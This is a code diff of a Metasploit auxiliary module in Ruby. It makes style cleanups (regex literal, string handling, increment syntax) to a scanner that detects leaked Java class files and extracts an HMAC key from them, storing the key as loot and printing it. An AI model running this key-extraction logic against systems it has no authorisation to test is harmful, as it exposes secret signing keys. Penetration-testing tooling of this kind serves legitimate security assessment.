@@ -60,8 +60,8 @@ class MetasploitModule < Msf::Auxiliary
         'uri' => normalized_url
       })
 
-      if res.code == 200 && res.headers['Content-Type'] =~ /application\/java.*/
-        print_good("Java file leak at #{rhost}:#{rport.to_s}#{normalized_url}")
+      if res.code == 200 && res.headers['Content-Type'] =~ %r{application/java.*}
+        print_good("Java file leak at #{rhost}:#{rport}#{normalized_url}")
         Exploit::CheckCode::Vulnerable
       else
         Exploit::CheckCode::Safe
@@ -112,7 +112,7 @@ class MetasploitModule < Msf::Auxiliary
     byte_start = key_start + key_marker.length + 1
     key_size = raw_class_file[byte_start..byte_start + 1]
     key_size = key_size.unpack('C*').join.to_i
-    byte_start = byte_start + 2
+    byte_start += 2
 
     key = raw_class_file[byte_start..byte_start + key_size - 1]
     path = store_loot(
@@ -127,7 +127,7 @@ class MetasploitModule < Msf::Auxiliary
       print_good("HMAC key found: #{key}.")
     else
       print_bad(
-        "Could not find key. " +
+        'Could not find key. ' \
         "Please check #{path} in case key is in an unexpected format."
       )
     end
